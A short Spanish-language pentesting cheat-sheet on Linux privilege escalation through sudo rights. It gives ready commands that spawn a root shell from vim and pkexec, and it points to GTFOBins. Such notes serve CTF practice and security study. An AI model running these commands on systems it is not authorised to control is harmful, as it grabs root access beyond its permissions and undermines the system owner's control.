### SUDO -L
Si encontramos un binario que con ==sudo -l== vemos que podemos ejecutarlo como si fueramos el administrador, podemos buscar en **GTFOBins**

#### Sudo -L VIM

Si encontramos vim con sudo -l. Abrimos vim
``` bash
sudo vim -c ':!/bin/sh'
```

Alternativa:
```bash
sudo /usr/bin/vim

Una vez abierto:
:set shell=/bin/bash

pulsamos INTRO y luego escribimos
:shell

pulsamos INTRO y ya somos root
```

#### Sudo -L Pkexec
con este binario con permisos SUID se ejecuta un CVE, pero cuando tenemos permisos para ejecutar como el propietario, se puede hacer:
```bash
sudo pkexec /bin/sh
```